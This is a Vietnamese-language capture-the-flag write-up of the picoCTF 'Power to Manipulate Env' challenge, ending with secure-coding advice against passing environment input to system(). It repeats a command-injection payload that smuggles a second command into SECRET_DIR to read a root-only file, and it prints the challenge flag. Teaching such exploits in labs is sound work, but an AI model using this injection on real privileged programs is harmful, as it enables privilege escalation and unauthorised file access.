# picoCTF - Power to Manipulate Env

## Thông tin bài

- **Dạng lỗi:** Environment Variable Manipulation + Command Injection
- **Binary:** `./bin`
- **Flag:** `picoCTF{Power_t0_man!pul4t3_3nv_3f693329}`

## Ý tưởng chính

Bài này cho một chương trình `./bin` có khả năng chạy với quyền cao hơn user thường. Chương trình lấy giá trị từ biến môi trường `SECRET_DIR`, sau đó dùng giá trị đó để liệt kê nội dung thư mục.

Khi chạy thử:

```bash
SECRET_DIR="/root" ./bin
```

kết quả nhận được:

```text
Listing the content of /root as root:
flag.txt
```

Điều này cho thấy chương trình đã lấy giá trị `/root` từ biến môi trường `SECRET_DIR`, rồi dùng nó để chạy lệnh liệt kê thư mục `/root`.

Vấn đề là chương trình có khả năng đang ghép lệnh shell dạng gần giống:

```c
system("ls " + SECRET_DIR);
```

hoặc tương đương:

```bash
ls <giá_trị_SECRET_DIR>
```

Nếu input từ biến môi trường không được kiểm tra kỹ, ta có thể chèn thêm lệnh khác vào sau bằng dấu `;`.

## Phân tích lỗi

Trong shell Linux, dấu `;` dùng để tách nhiều lệnh trên cùng một dòng.

Ví dụ:

```bash
ls /root; cat /root/flag.txt
```

Shell sẽ hiểu là chạy 2 lệnh liên tiếp:

```bash
ls /root
cat /root/flag.txt
```

Vì vậy, nếu chương trình gọi shell thông qua `system()` và ghép trực tiếp giá trị của `SECRET_DIR` vào lệnh, ta có thể đặt:

```bash
SECRET_DIR="/root; cat /root/flag.txt"
```

Khi đó lệnh thực tế mà chương trình chạy sẽ gần giống:

```bash
ls /root; cat /root/flag.txt
```

Lệnh đầu tiên `ls /root` sẽ liệt kê thư mục `/root`.

Lệnh thứ hai `cat /root/flag.txt` sẽ đọc nội dung file flag.

Do chương trình chạy phần lệnh này với quyền root nên `cat /root/flag.txt` đọc được file mà user thường không đọc được trực tiếp.

## Các bước khai thác

### Bước 1: Chạy thử với `SECRET_DIR=/root`

```bash
SECRET_DIR="/root" ./bin
```

Kết quả:

```text
Listing the content of /root as root:
flag.txt
```

Ta biết được file flag nằm ở:

```text
/root/flag.txt
```

### Bước 2: Thử đọc trực tiếp bằng `cat`

```bash
cat flag.txt
```

Kết quả:

```text
cat: flag.txt: No such file or directory
```

Lý do là file `flag.txt` không nằm ở thư mục hiện tại của user. Nó nằm trong `/root`, mà user thường không có quyền đọc trực tiếp.

### Bước 3: Chèn thêm lệnh qua biến môi trường

Ta đặt `SECRET_DIR` thành:

```bash
/root; cat /root/flag.txt
```

Payload hoàn chỉnh:

```bash
SECRET_DIR="/root; cat /root/flag.txt" ./bin
```

Lúc này chương trình bị ép chạy thêm lệnh `cat /root/flag.txt`.

### Bước 4: Nhận flag

Kết quả thu được:

```text
picoCTF{Power_t0_man!pul4t3_3nv_3f693329}
```

## Payload cuối cùng

```bash
SECRET_DIR="/root; cat /root/flag.txt" ./bin
```

## Giải thích ngắn gọn

- `SECRET_DIR="/root"` chỉ làm chương trình liệt kê thư mục `/root`.
- Trong `/root` có file `flag.txt`.
- Chương trình dùng giá trị `SECRET_DIR` để tạo lệnh shell nhưng không lọc ký tự nguy hiểm.
- Dấu `;` cho phép tách thêm một lệnh mới.
- Ta chèn thêm `cat /root/flag.txt` để đọc flag.
- Vì chương trình chạy với quyền root nên lệnh `cat` bên trong chương trình đọc được file flag.

## Bài học rút ra

Không nên truyền trực tiếp dữ liệu người dùng hoặc biến môi trường vào `system()`.

Ví dụ nguy hiểm:

```c
system(command);
```

trong đó `command` có chứa dữ liệu do người dùng kiểm soát.

Cách an toàn hơn là tránh dùng shell, hoặc kiểm tra chặt chẽ input trước khi sử dụng. Nếu cần liệt kê thư mục, nên dùng các hàm hệ thống như `opendir()`, `readdir()` thay vì ghép chuỗi rồi gọi `system("ls ...")`.
